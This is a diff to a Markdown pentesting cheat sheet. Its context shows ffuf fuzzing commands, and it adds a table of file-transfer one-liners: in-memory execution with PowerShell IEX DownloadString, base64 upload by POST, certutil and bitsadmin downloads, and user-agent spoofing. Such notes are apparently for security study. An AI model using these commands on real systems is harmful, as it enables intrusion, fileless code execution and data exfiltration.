@@ -47,3 +47,15 @@
 | `ffuf -w wordlist.txt:FUZZ -u http://URL:PORT/login.php?FUZZ=key -fs xxx`                                                                   | Parameter Fuzzing - GET  |
 | `ffuf -w wordlist.txt:FUZZ -u http://URL:PORT/login.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST |
 | `ffuf -w ids.txt:FUZZ -u http://URL:PORT/login.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`       | Value Fuzzing            |
+## File transfers
+| **Command**                                                                                                        | **Description**                              |
+| ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------- |
+| `Invoke-WebRequest <URL> -OutFile <output filename>`                                                               | Download a file                              |
+| `IEX (New-Object Net.WebClient).DownloadString('<URL>')`                                                           | Execute a file in memory                     |
+| `Invoke-WebRequest -Uri <URL> -Method POST -Body $b64`                                                             | Upload a file                                |
+| `bitsadmin /transfer n <URL> <OUTPUT PATH>`                                                                        | Download a file using Bitsadmin              |
+| `certutil.exe -verifyctl -split -f <URL>`                                                                          | Download a file using Certutil               |
+| `wget <URL> -O <OUTPUT PATH>`                                                                                      | Download a file using Wget                   |
+| `curl -o <OUTPUT PATH> <URL>`                                                                                      | Download a file using cURL                   |
+| `php -r '$file = file_get_contents("<URL>"); file_put_contents("<FILENAME>",$file);'`                              | Download a file using PHP                    |
+| `Invoke-WebRequest <URL> -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Firefox -OutFile "<OUTPUT FILE>"` | Invoke-WebRequest using a Firefox User Agent |
